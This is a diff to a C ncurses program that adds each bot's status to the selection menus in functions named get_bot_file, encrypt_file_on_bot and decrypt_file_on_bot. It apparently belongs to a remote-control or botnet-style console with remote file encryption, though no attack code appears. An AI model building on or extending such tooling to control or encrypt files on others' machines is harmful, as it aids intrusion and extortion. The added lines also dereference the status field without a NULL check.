@@ -1561,18 +1561,18 @@ void get_bot_file() {
         for (int i = 0; i < total_bots; i++) {
             cJSON *bot = cJSON_GetArrayItem(parsed_json, i);
             cJSON *id_obj = cJSON_GetObjectItem(bot, "id");
-
+            cJSON *status = cJSON_GetObjectItem(bot, "status");
             if (cJSON_IsString(id_obj)) {
                 if (i == highlight) {
                     attron(A_BOLD | COLOR_PAIR(1)); // Highlight the selected bot in blue
-                    mvprintw(i + 1, 0, "> %s", id_obj->valuestring);
+                    mvprintw(i + 1, 0, "> %s (%s)", id_obj->valuestring, status->valuestring);
                     attroff(A_BOLD | COLOR_PAIR(1));
                     // Update the footer with the currently highlighted bot
                     strncpy(selected_bot, id_obj->valuestring, sizeof(selected_bot) - 1);
                     selected_bot[sizeof(selected_bot) - 1] = '\0'; // Ensure null termination
                 } else {
                     attron(COLOR_PAIR(2)); // Normal bots in white
-                    mvprintw(i + 1, 0, "  %s", id_obj->valuestring);
+                    mvprintw(i + 1, 0, "  %s (%s)", id_obj->valuestring, status->valuestring);
                     attroff(COLOR_PAIR(2));
                 }
             }
@@ -2444,15 +2444,16 @@ void encrypt_file_on_bot() {
         for (int i = 0; i < total_bots; i++) {
             cJSON *bot = cJSON_GetArrayItem(parsed_json, i);
             cJSON *id_obj = cJSON_GetObjectItem(bot, "id");
+            cJSON *status_obj = cJSON_GetObjectItem(bot, "status");
             if (cJSON_IsString(id_obj)) {
                 if (i == highlight) {
                     attron(A_BOLD | COLOR_PAIR(1));
-                    mvprintw(i + 1, 0, "> %s", id_obj->valuestring);
+                    mvprintw(i + 1, 0, "> %s (%s)", id_obj->valuestring, status_obj->valuestring);
                     attroff(A_BOLD | COLOR_PAIR(1));
                     strncpy(selected_bot, id_obj->valuestring, sizeof(selected_bot) - 1);
                     selected_bot[sizeof(selected_bot) - 1] = '\0';
                 } else {
-                    mvprintw(i + 1, 0, "  %s", id_obj->valuestring);
+                    mvprintw(i + 1, 0, "  %s (%s)", id_obj->valuestring, status_obj->valuestring);
                 }
             }
         }
@@ -2668,15 +2669,16 @@ void decrypt_file_on_bot() {
         for (int i = 0; i < total_bots; i++) {
             cJSON *bot = cJSON_GetArrayItem(parsed_json, i);
             cJSON *id_obj = cJSON_GetObjectItem(bot, "id");
+            cJSON *status_obj = cJSON_GetObjectItem(bot, "status");
             if (cJSON_IsString(id_obj)) {
                 if (i == highlight) {
                     attron(A_BOLD | COLOR_PAIR(1));
-                    mvprintw(i + 1, 0, "> %s", id_obj->valuestring);
+                    mvprintw(i + 1, 0, "> %s (%s)", id_obj->valuestring, status_obj->valuestring);
                     attroff(A_BOLD | COLOR_PAIR(1));
                     strncpy(selected_bot, id_obj->valuestring, sizeof(selected_bot) - 1);
                     selected_bot[sizeof(selected_bot) - 1] = '\0';
                 } else {
-                    mvprintw(i + 1, 0, "  %s", id_obj->valuestring);
+                    mvprintw(i + 1, 0, "  %s (%s)", id_obj->valuestring, status_obj->valuestring);
                 }
             }
         }
